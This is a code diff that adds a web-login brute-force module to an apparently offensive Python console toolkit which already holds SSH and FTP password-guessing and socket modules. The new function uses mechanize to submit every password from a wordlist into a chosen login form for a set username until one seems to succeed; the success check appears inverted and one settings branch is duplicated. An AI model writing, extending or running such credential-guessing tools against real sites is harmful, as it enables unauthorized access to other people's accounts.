@@ -10,6 +10,8 @@ from cryptography.fernet import Fernet
 from paramiko import SSHClient
 import paramiko
 from ftplib import FTP
+import mechanize
+from mechanize import Browser
 
 #-------------------------------------------------------------#
 
@@ -20,7 +22,7 @@ using = "nothing"
 HOST = "127.0.0.1"
 LPORT = ""
 PORT = 1234
-library_list = ["socket/server", "socket/client", "files/encrypt", "files/decrypt" , "ssh/pass", "ftp/pass"]
+library_list = ["socket/server", "socket/client", "files/encrypt", "files/decrypt" , "ssh/pass", "ftp/pass", "web/pass"]
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 if using == "socketS":
     server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -36,6 +38,13 @@ FTPPORT = 21
 client = SSHClient()
 sshusername = ''
 ftpusername = ''
+url = ""
+sucurl = ""
+webuser = ""
+formnumber = 0
+formpassname = ""
+formusername = ""
+
 #-------------------------------------------------------------#
 
 def baner():
@@ -309,6 +318,33 @@ def ftpPass():
         print("failed")
 
 #------------------------bruteforce ftp-----------------------#
+#------------------------bruteforce web-----------------------#
+
+def webPass():
+    br = Browser()
+    br.set_handle_robots(False)
+    try:
+        f = open(wordlist)
+        lines = f.readlines()
+        br.open(url)
+        for i in range(len(lines)):
+            passL = lines[i].strip()
+            br.select_form(nr = int(formnumber))
+            br.form[formusername] = webuser
+            br.form[formpassname] = passL
+            br.method = "POST"
+            response = br.submit()
+            niceurl = response.geturl()
+            if niceurl == sucurl:
+                print("password failed: " + Fore.LIGHTRED_EX + passL + Fore.RESET)
+            else:
+                print("password found: " + Fore.GREEN + passL + Fore.RESET)
+                break
+    except:
+        print("failed")
+
+
+#------------------------bruteforce web-----------------------#
 
 baner()
 excodeInput = "eXcode> "
@@ -372,6 +408,9 @@ while True:
             elif use == str(library_list[5]):
                 excodeInput = "eXcode(" + Fore.RED + str(library_list[5]) + Fore.LIGHTGREEN_EX + ")> "
                 using = "ftpP"
+            elif use == str(library_list[6]):
+                excodeInput = "eXcode(" + Fore.RED + str(library_list[6]) + Fore.LIGHTGREEN_EX + ")> "
+                using = "webP"
             elif use == "nothing":
                 using = "nothing"
                 excodeInput = "eXcode> "
@@ -398,7 +437,9 @@ while True:
                         LPORT = setL.split("PORT ",1)[1]
                         PORT = int(LPORT)
                     except:
-                        print("error in PORT")                
+                        print("error in PORT")    
+                else:
+                    print("error setting")            
             except:
                 print("error in seting")
         elif using == "encryptF":
@@ -422,6 +463,8 @@ while True:
                         keyfilename = Kfile
                     except:
                         print("can't find file")
+                else:
+                    print("error setting")
             except:
                 print("error setting")
         elif using == "decryptF":
@@ -445,6 +488,8 @@ while True:
                         keyfilename = Kfile
                     except:
                         print("can't find file")
+                else:
+                    print("error setting")
             except:
                 print("error setting")  
         elif using == "sshP" or using == "ftpP":
@@ -477,8 +522,57 @@ while True:
                         wordlist = sshW.split("Wordlist ",1)[1]
                     except:
                         print("error wordlist setting")
+                else:
+                    print("error setting")
             except:
                         print("error setting")
+        elif using == "webP":
+            try:
+                setL = excode.split("set ",1)[1]
+                if setL.startswith('URL '):
+                    try:
+                        url = setL.split("URL ",1)[1]
+                    except:
+                        print("can't find file")
+                elif setL.startswith('Logedurl '):
+                    try:
+                        sucurl = setL.split("Logedurl ",1)[1]
+                    except:
+                        print("can't find file")
+                elif setL.startswith('Wordlist '):
+                    try:
+                        wordlist = setL.split("Wordlist ",1)[1]
+                    except:
+                        print("can't find file")
+                elif setL.startswith('Wordlist '):
+                    try:
+                        wordlist = setL.split("Wordlist ",1)[1]
+                    except:
+                        print("can't find file")
+                elif setL.startswith('Username '):
+                    try:
+                        webuser = setL.split("Username ",1)[1]
+                    except:
+                        print("error setting username")
+                elif setL.startswith('Fpwd '):
+                    try:
+                        formpassname = setL.split("Fpwd ",1)[1]
+                    except:
+                        print("error setting form password input")
+                elif setL.startswith('Fusr '):
+                    try:
+                        formusername = setL.split("Fusr ",1)[1]
+                    except:
+                        print("error form username input")
+                elif setL.startswith('Fnum '):
+                    try:
+                        formnumber = setL.split("Fnum ",1)[1]
+                    except:
+                        print("error form number in list")
+                else:
+                    print("error setting")
+            except:
+                print("error setting")  
         else:
             print("invalid set")  
 #------------------set is here------------------#
@@ -528,6 +622,14 @@ while True:
             print("PORT: " + str(FTPPORT))
             print("Wordlist: " + wordlist)
             print("Username: " + ftpusername)
+        elif using == "webP":
+            print("URL: " + url)
+            print("Logedurl: " + sucurl)
+            print("Wordlist: " + wordlist)
+            print("Username: " + webuser)
+            print("Fnum: " + str(formnumber))
+            print("Fusr: " + formusername)
+            print("Fpwd: " + formpassname)
         else:
             print("you need to set a library.")
 #------------------show is here------------------#
@@ -562,6 +664,11 @@ while True:
                 ftpPass()
             else:
                 print("you need to set values to the files")
+        elif using == "webP":
+            if  webuser != '' and wordlist != '' and formpassname != '' and formusername != '':
+                webPass()
+            else:
+                print("you need to set values")
         else:
             print('run what??')
     elif excode.startswith(' '):
